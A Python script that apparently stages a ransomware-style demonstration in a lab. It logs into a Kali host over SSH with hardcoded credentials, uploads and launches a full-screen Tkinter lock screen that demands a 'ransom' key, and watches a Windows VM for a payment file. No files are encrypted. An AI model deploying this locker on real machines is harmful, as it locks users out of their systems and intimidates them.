#!/usr/bin/env python3
import sys
import paramiko
import threading
import time

# --- LAB CREDENTIALS ---
TARGET_KALI = "172.16.1.100"
TARGET_WIN = "172.16.1.102"
USERNAME = "CEO"
PASSWORD = "CEOPass123!"

ssh_kali = None

def check_for_payment():
    """Background thread that checks the Windows VM for the PAID.txt file."""
    global ssh_kali
    print("[*] Started payment monitor thread.")
    
    try:
        win_ssh = paramiko.SSHClient()
        win_ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        win_ssh.connect(TARGET_WIN, username=USERNAME, password=PASSWORD)
    except Exception as e:
        print(f"[-] Monitor thread could not connect to Windows: {e}")
        return

    while True:
        time.sleep(3)
        try:
            stdin, stdout, stderr = win_ssh.exec_command('if exist C:\\Windows\\Temp\\PAID.txt (echo FOUND)')
            result = stdout.read().decode().strip()
            
            if "FOUND" in result:
                print("\n[+] Payment detected on Windows VM! Ending Kali simulation...")
                ssh_kali.exec_command("pkill -f ransom_sim.py")
                win_ssh.exec_command('del C:\\Windows\\Temp\\PAID.txt')
                break
        except Exception:
            break
            
    win_ssh.close()

def main():
    global ssh_kali
    
    monitor = threading.Thread(target=check_for_payment, daemon=True)
    monitor.start()

    print(f"[*] Preparing to deploy payload to hardened target {TARGET_KALI}...")

    payload_script = """#!/usr/bin/env python3
import tkinter as tk
import time
import subprocess
import threading

is_decrypting = False

def force_fullscreen():
    time.sleep(0.5)
    try:
        subprocess.run(["xdotool", "search", "--name", "System Locked", "windowmove", "0", "0"], check=False)
        subprocess.run(["xdotool", "search", "--name", "System Locked", "windowsize", "100%", "100%"], check=False)
        subprocess.run(["xdotool", "search", "--name", "System Locked", "windowraise"], check=False)
    except Exception:
        pass

def create_prompt_window():
    # Create a REAL window for the prompt so it can accept keyboard input
    prompt_win = tk.Toplevel(root)
    prompt_win.title("Payment Required")
    prompt_win.geometry("500x250")
    prompt_win.configure(bg="black")
    prompt_win.attributes('-topmost', True) # Keep it above the lock screen
    prompt_win.resizable(False, False)
    
    # Center it
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    x = (screen_width // 2) - 250
    y = (screen_height // 2) - 125
    prompt_win.geometry(f"500x250+{x}+{y}")

    tk.Label(prompt_win, text="Enter the decryption key\nto unlock your files:", 
             fg="lime", bg="black", font=("Courier", 16, "bold")).pack(pady=20)
             
    entry = tk.Entry(prompt_win, show="*", font=("Courier", 20), width=20)
    entry.pack(pady=10)
    
    def check_password(event=None):
        global is_decrypting
        if is_decrypting:
            return
            
        if entry.get() == "Ransomware2026!":
            is_decrypting = True
            prompt_win.destroy()
            
            lbl.config(text="Decrypting...")
            root.update()
            for i in range(0, 101, 10):
                lbl.config(text=f"Decrypting your files... {i}%")
                root.update()
                time.sleep(0.2)
            root.destroy()
        else:
            entry.delete(0, tk.END)
            prompt_win.configure(bg="darkred")
            prompt_win.update()
            time.sleep(0.3)
            prompt_win.configure(bg="black")

    tk.Button(prompt_win, text="Decrypt", command=check_password, 
              bg="darkred", fg="white", font=("Courier", 16, "bold")).pack(pady=10)
              
    entry.bind('<Return>', check_password)
    
    # Force keyboard focus to the new window
    prompt_win.focus_force()
    entry.focus_set()
    
    # Use xdotool to force the OS to activate this specific new window
    try:
        subprocess.run(["xdotool", "search", "--name", "Payment Required", "windowactivate"], check=False)
    except Exception:
        pass

root = tk.Tk()
root.title("System Locked")
root.configure(background='black')
root.overrideredirect(True)
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()
root.geometry(f"{screen_width}x{screen_height}+0+0")
root.attributes('-topmost', True) 

lbl = tk.Label(root, text="Your Kali files have been simulated-encrypted!\\n\\nYou must pay the ransom on the Windows Device to unlock.", 
               fg="lime", bg="black", font=("Courier", 26, "bold"))
lbl.pack(expand=True, fill='both')

btn = tk.Button(root, text="Pay Ransom", command=create_prompt_window, 
                bg="darkred", fg="white", font=("Courier", 20, "bold"))
btn.pack(side="bottom", pady=50)

root.protocol("WM_DELETE_WINDOW", lambda: None)
threading.Thread(target=force_fullscreen, daemon=True).start()
root.mainloop()
"""

    try:
        print("[*] Connecting via SSH to Kali...")
        ssh_kali = paramiko.SSHClient()
        ssh_kali.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_kali.connect(TARGET_KALI, username=USERNAME, password=PASSWORD)
        
        print("[*] Uploading payload to Kali /tmp/ransom_sim.py...")
        sftp = ssh_kali.open_sftp()
        with sftp.file('/tmp/ransom_sim.py', 'w') as f:
            f.write(payload_script)
        ssh_kali.exec_command("chmod +x /tmp/ransom_sim.py")
        sftp.close()

        print("[*] Triggering GUI on Kali...")
        exec_cmd = (
            f"export DISPLAY=:0; "
            f"export XAUTHORITY=/home/{USERNAME}/.Xauthority; "
            f"nohup python3 /tmp/ransom_sim.py > /tmp/gui_out.log 2>&1 &"
        )
        ssh_kali.exec_command(exec_cmd)
        
        print("[+] Kali simulation launched. Monitoring Windows for payment...")
        
        while True:
            time.sleep(1)

    except paramiko.AuthenticationException:
        print("[-] Authentication failed. Check your credentials.")
    except KeyboardInterrupt:
        print("\n[*] Stopping monitor.")
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
